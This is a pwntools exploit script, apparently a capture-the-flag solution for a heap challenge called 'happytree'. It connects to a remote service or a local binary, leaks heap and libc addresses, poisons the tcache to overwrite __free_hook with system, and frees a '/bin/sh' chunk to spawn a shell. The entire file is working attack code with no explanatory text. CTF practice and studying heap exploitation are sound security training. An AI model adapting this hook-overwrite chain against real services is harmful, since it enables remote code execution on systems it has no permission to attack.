from pwn import *
import sys

if sys.argv[1] == "l":
    p = process("./happytree_patched")
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, """ 
                continue
                    """)
else:
    p = remote("124.71.147.225", 9999)
# data is size of note
libc = ELF("libc.so.6")
elf = ELF("happytree_patched")

def insert(data, content):
    p.sendlineafter("cmd> ", "1")
    p.sendlineafter("data: ", str(data))
    if content != "":
        p.sendafter("content: ", content)

def delete(data):
    p.sendlineafter("cmd> ", "2")
    p.sendlineafter("data: ", str(data))

def show(data):
    p.sendlineafter("cmd> ", "3")
    p.sendlineafter("data: ", str(data))

def solve():
    insert(0xff, "\n")
    insert(0xfe, "\n")
    delete(0xff)
    delete(0xfe)
    insert(0x20, "A"*0x10)
    show(0x20)

    p.recvuntil("A"*0x10)
    heap_addr = u64(p.recv(6)+"\x00\x00") - 0x11fb0
    target_heap = heap_addr + 0x125e0
    success("target_heap: %s"%hex(target_heap))
    success("heap addr: %s"%hex(heap_addr))
    for i in range(9):              # a chunk to avoid merge unsorted 
        insert(0xf0 + i, str(i)*(0xf0))

    for i in range(8):
        delete(0xf0+i)

    insert(0x60, "A"*8)
    show(0x60)

    p.recvuntil("A"*8)
    libc_leak = u64(p.recv(6)+"\x00\x00")
    libc.address = libc_leak - 0x3ebd90
    free_hook = libc.symbols["__free_hook"]
    malloc_hook = libc.symbols["__malloc_hook"]
    system = libc.symbols["system"] 
    success("libc_leak: %s"%hex(libc_leak))
    success("libc address: %s"%hex(libc.address))
    success("free_hook: %s"%hex(free_hook))
    success("malloc_hook: %s"%hex(malloc_hook))
    success("system: %s"%hex(system))

    for i in range(0x15, 0x10, -1):
        insert(i, "\n")
    # p.interactive()
    insert(0x21, p64(0x61) + p64(target_heap) + p64(0)*2)
    insert(0xf0, "\n") # take a chunk 0x100 from tcache heap cause it full

    # p.interactive()
    delete(0x61)

    insert(0xf4, p64(free_hook))
    insert(0xf3, "\n")
    insert(0xf2, "/bin/sh")
    insert(0xf1, p64(system))
    delete(0xf2)
    p.interactive()

if __name__ == "__main__":
    solve()

